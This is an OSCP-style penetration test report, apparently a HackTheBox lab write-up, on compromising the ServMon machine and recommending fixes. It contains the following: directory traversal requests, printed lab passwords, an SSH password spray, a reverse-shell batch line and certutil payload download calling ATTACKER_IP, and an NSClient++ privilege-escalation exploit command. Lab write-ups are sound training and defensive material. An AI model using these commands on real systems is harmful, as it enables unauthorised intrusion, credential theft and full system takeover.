# HTB ServMon - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-12

---

## 1. Executive Summary

A penetration test was conducted against the ServMon target system. Multiple vulnerabilities were identified, including anonymous FTP access exposing sensitive files, a directory traversal vulnerability in NVMS-1000, credential reuse, and a vulnerable NSClient++ installation.

Initial access was achieved by exploiting a directory traversal vulnerability in NVMS-1000 to retrieve password files from a user desktop. Recovered credentials were used to gain SSH access as user `nadine`. Privilege escalation to `NT AUTHORITY\SYSTEM` was achieved through exploitation of NSClient++ version 0.5.2.35.

The system was fully compromised.

---

## 2. Scope

- **Target:** 10.129.188.34
- **Environment:** HackTheBox ServMon (Retired Machine)
- **Testing Window:** 2026-5-9 to 2026-5-12
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 10.129.188.34 -T4 -oA servmon_tcp
```

Relevant Output:

```
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5666/tcp open  tcpwrapped
6063/tcp open  tcpwrapped
6699/tcp open  tcpwrapped
8443/tcp open  ssl/http
```

Interpretation:

The target exposed multiple Windows services, including FTP, SMB, SSH, and a HTTPS service running NSClient++ on TCP port 8443.

---

## 5. Enumeration

### Anonymous FTP Enumeration

Anonymous FTP access was tested.

Command:

```
ftp 10.129.188.34
```

Output:

```
230 User logged in.
```

Interpretation:

Anonymous FTP access was enabled, allowing access to user directories and internal files.

### Download Sensitive Files

Command:

```
binary
cd Users
cd Nadine
get Confidential.txt
cd ../Nathan
get Notes\ to\ do.txt
```

Output:

```
Transfer complete.
```

Interpretation:

Internal user files were successfully downloaded for offline analysis.

---

### Web Enumeration

The web application on TCP port 80 was identified as NVMS-1000.

A public directory traversal vulnerability was identified.

Reference:

```
https://www.exploit-db.com/exploits/47774
```

### Verify Directory Traversal

Command:

```
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
```

Relevant Output:

```
for 16-bit app support
```

Interpretation:

The application was vulnerable to arbitrary file disclosure through directory traversal.

### Retrieve Password File

A password file was retrieved from Nathan's desktop.

Command:

```
GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt HTTP/1.1
```

Relevant Output:

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

Interpretation:

Potential user credentials were exposed through the vulnerable application.

### Credential Validation

Recovered credentials were tested against SSH access.

Command:

```
netexec ssh 10.129.188.34 -u usernames.txt -p passwords.txt --continue-on-success
```

Relevant Output:

```
nadine:L1k3B1gBut7s@W0rk
```

Interpretation:

Valid SSH credentials for user `nadine` were identified.

---

## 6. Initial Access

### SSH Access

SSH access was obtained using the recovered credentials.

Command:

```
ssh nadine@10.129.188.34
```

Password:

```
L1k3B1gBut7s@W0rk
```

Verification:

Command:

```
whoami
hostname
```

Output:

```
servmon\nadine
SERVMON
```

Interpretation:

Interactive shell access was obtained as user `nadine`.

---

## 7. Post-Exploitation

### NSClient++ Enumeration

The NSClient++ configuration file was reviewed.

Command:

```
type "C:\Program Files\NSClient++\nsclient.ini"
```

Relevant Output:

```
password = ew2x6SsGTxjRwXOT
```

Interpretation:

Administrative credentials for the NSClient++ service were recovered.

### Access NSClient++ Web Interface

Direct access to the NSClient++ interface returned a 403 response because the service only accepted localhost connections.

A local SSH port forward was created.

Command:

```
ssh -L 8443:127.0.0.1:8443 nadine@10.129.188.34
```

The administrative interface was then accessed locally.

URL:

```
https://127.0.0.1:8443
```

Interpretation:

SSH tunneling allowed access to the localhost-restricted NSClient++ administrative interface.

### Create Malicious Batch File

A malicious batch file was created to execute a reverse shell.

Contents of `evil.bat`:

```
C:\Windows\Tasks\nc.exe ATTACKER_IP 443 -e cmd.exe
```

### Transfer Netcat and Payload

Command:

```
certutil -urlcache -split -f http://ATTACKER_IP/nc.exe
```

Interpretation:

Netcat was transferred to the target host to facilitate reverse shell execution.

### Configure NSClient++ External Script

A new external script named `foobar` was configured through the NSClient++ administrative interface.

Configuration:

```
command = C:\\windows\\tasks\\evil.bat
```

### Configure Scheduled Task

A scheduler entry was configured to execute the malicious script every 10 seconds.

Interpretation:

NSClient++ functionality permitted execution of attacker-controlled scripts.

### Reload NSClient++

The service was reloaded through the administrative interface.

Listener:

```
rlwrap nc -lnvp 443
```

Interpretation:

The initial exploitation attempt through the web interface did not result in a shell.

### Identify NSClient++ Version

Command:

```
"C:\Program Files\NSClient++\nscp.exe" --version
```

Relevant Output:

```
NSClient++ 0.5.2.35
```

Interpretation:

The installed version matched a known privilege escalation vulnerability.

---

## 8. Privilege Escalation

### NSClient++ Privilege Escalation

A public exploit for NSClient++ 0.5.2.35 was identified.

Reference:

```
https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation
```

### Transfer Netcat

Netcat was transferred to the target host.

Command:

```
certutil -urlcache -split -f http://ATTACKER_IP/nc.exe
```

Interpretation:

The payload required a reverse shell binary on the target.

### Start Listener

Command:

```
rlwrap nc -lnvp 443
```

### Execute Exploit

Command:

```
./exploit.py "C:\\Windows\\Tasks\\nc.exe ATTACKER_IP 443 -e cmd.exe" https://127.0.0.1:8443 ew2x6SsGTxjRwXOT
```

Relevant Output:

```
connect to [ATTACKER_IP]
```

Verification:

Command:

```
whoami
hostname
ipconfig
```

Output:

```
nt authority\system
SERVMON
10.129.188.34
```

Interpretation:

Privilege escalation to `NT AUTHORITY\SYSTEM` was successful.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

Command:

```
type C:\Users\Nadine\Desktop\user.txt
```

---

**Root Flag**: *REDACTED*

Command:

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Anonymous FTP Access Exposing Sensitive Files

**Severity:** High

**Description:**
The FTP service allowed anonymous login and exposed sensitive internal user files.

**Impact:**
Attackers could retrieve sensitive information and internal documentation aiding further compromise.

**Recommendation:**
Disable anonymous FTP access and restrict access to sensitive files and directories.

### **Finding:** NVMS-1000 Directory Traversal Vulnerability

**Severity:** Critical

**Description:**
The NVMS-1000 web application was vulnerable to directory traversal, allowing arbitrary file disclosure.

**Impact:**
Attackers could read sensitive files from the operating system, including password files and configuration data.

**Recommendation:**
Upgrade or replace the vulnerable application and implement strict path sanitization controls.

### **Finding:** Credential Reuse Across Services

**Severity:** High

**Description:**
Credentials exposed through one service were reused for SSH access.

**Impact:**
Attackers could leverage disclosed credentials to gain interactive access to the operating system.

**Recommendation:**
Enforce unique passwords across services and implement credential rotation policies.

### **Finding:** Vulnerable NSClient++ Installation Allowing Privilege Escalation

**Severity:** Critical

**Description:**
The installed NSClient++ version was vulnerable to authenticated remote code execution and privilege escalation.

**Impact:**
Attackers with low-privileged access could execute arbitrary commands as `NT AUTHORITY\SYSTEM`.

**Recommendation:**
Upgrade NSClient++ to a patched version and restrict access to the administrative interface.

---

## 11. Appendix

NVMS-1000 Directory Traversal -
[https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774)

NSClient++ 0.5.2.35 Privilege Escalation -
[https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)

NSClient++ Exploit Repository -
[https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation](https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation)